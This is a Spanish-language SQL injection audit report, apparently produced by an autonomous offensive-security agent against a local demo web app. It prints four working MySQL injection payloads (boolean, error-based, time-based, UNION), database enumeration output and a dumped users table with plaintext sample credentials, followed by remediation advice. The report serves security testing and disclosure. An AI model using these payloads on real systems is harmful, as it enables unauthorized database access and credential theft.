# Informe de Auditoría de Seguridad - SQL Injection
**Fecha:** 2026-04-27 11:58:15 UTC  
**Objetivo:** http://web.dev.local:8083  
**Analista:** Agente Autónomo de Seguridad Ofensiva  
**Clasificación:** CONFIDENCIAL

---

## 1. Resumen Ejecutivo

Se realizó un análisis de seguridad dinámico (DAST) sobre la aplicación web alojada en `http://web.dev.local:8083`. Se identificó y explotó con éxito una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` del endpoint principal (método GET). La explotación permitió extraer completamente la base de datos `sqli_demo`, incluyendo credenciales de 8 usuarios.

**Nivel de riesgo: CRÍTICO**

---

## 2. Vectores Analizados

| Endpoint | Método | Parámetro | Tipo de Entrada |
|---|---|---|---|
| `http://web.dev.local:8083/` | GET | `id` | Campo de formulario "User ID" |
| `http://web.dev.local:8083/` | GET | `Submit` | Botón de envío (no vulnerable) |

La aplicación expone un formulario HTML en la raíz con un campo de búsqueda por ID de usuario. El parámetro `id` se transmite via GET y es construido directamente en la consulta SQL sin sanitización.

---

## 3. Hallazgos

### Vulnerabilidad: SQL Injection en parámetro `id`

- **URL Vulnerable:** `http://web.dev.local:8083/?id=1&Submit=Submit`
- **Parámetro:** `id`
- **Método:** GET
- **DBMS:** MySQL >= 5.1 (MariaDB fork)
- **SO del servidor:** Linux Debian
- **Tecnología web:** Apache 2.4.65, PHP 8.1.33
- **Usuario DB:** `root@%` (privilegios máximos)
- **CVSS:** 10.0 (Crítico)

#### Tipos de inyección confirmados por sqlmap:

1. **Boolean-based blind**  
   ```
   Payload: id=1' AND 4855=(SELECT (CASE WHEN (4855=4855) THEN 4855 ELSE (SELECT 5578 UNION SELECT 1967) END))-- -
   ```

2. **Error-based (EXTRACTVALUE)**  
   ```
   Payload: id=1' AND EXTRACTVALUE(7032,CONCAT(0x5c,0x716a7a7671,(SELECT (ELT(7032=7032,1))),0x716b7a6a71)) AND 'VNQE'='VNQE
   ```

3. **Time-based blind (SLEEP)**  
   ```
   Payload: id=1' AND (SELECT 8779 FROM (SELECT(SLEEP(5)))fHXT) AND 'DaGw'='DaGw
   ```

4. **UNION query (2 columnas)** ← Usado para extracción de datos  
   ```
   Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716a7a7671,0x677648...,0x716b7a6a71)-- -
   ```

---

## 4. Evidencia de Explotación

### 4.1 Bases de datos enumeradas

```
current user: 'root@%'

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo
[*] sys
```

### 4.2 Tablas en base de datos `sqli_demo`

```
Database: sqli_demo
[1 table]
+-------+
| users |
+-------+
```

### 4.3 Volcado completo de la tabla `users`

```
Database: sqli_demo
Table: users
[8 entries]
+---------+---------------------+-------------+-----------+-----------+------------+
| user_id | email               | password    | username  | last_name | first_name |
+---------+---------------------+-------------+-----------+-----------+------------+
| 1       | admin@example.com   | password123 | admin     | Doe       | John       |
| 2       | jane@example.com    | secret456   | jsmith    | Smith     | Jane       |
| 3       | bob@example.com     | mypass789   | bjohnson  | Johnson   | Bob        |
| 4       | alice@example.com   | qwerty123   | awilliams | Williams  | Alice      |
| 5       | charlie@example.com | password    | cbrown    | Brown     | Charlie    |
| 6       | diana@example.com   | secure123   | ddavis    | Davis     | Diana      |
| 7       | eve@example.com     | hackme      | emiller   | Miller    | Eve        |
| 8       | frank@example.com   | admin123    | fwilson   | Wilson    | Frank      |
+---------+---------------------+-------------+-----------+-----------+------------+
```

**Impacto:** Credenciales en texto plano expuestas para 8 usuarios, incluyendo la cuenta `admin`.

---

## 5. Recomendaciones

1. **Usar consultas parametrizadas (Prepared Statements)** en lugar de concatenación directa de parámetros en SQL.
2. **Aplicar principio de mínimo privilegio** al usuario de base de datos (actualmente `root@%`).
3. **Implementar WAF** (Web Application Firewall) para detectar y bloquear payloads de inyección.
4. **Almacenar contraseñas con hash** (bcrypt, Argon2) en lugar de texto plano.
5. **Validar y sanitizar** todas las entradas de usuario en el lado del servidor.
6. **Deshabilitar mensajes de error detallados** en producción para evitar error-based SQLi.

---

## 6. Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad crítica de SQL Injection en el parámetro `id`. La explotación fue completamente exitosa: se enumeraron todas las bases de datos del servidor, se accedió a la base de datos `sqli_demo` y se extrajo la tabla `users` con 8 registros completos incluyendo contraseñas en texto plano. El usuario de base de datos `root@%` con el que opera la aplicación otorga control total sobre el DBMS, lo que podría permitir ataques adicionales como lectura/escritura de archivos del sistema.

**Veredicto:** VULNERABILIDAD CONFIRMADA Y EXPLOTADA CON ÉXITO.
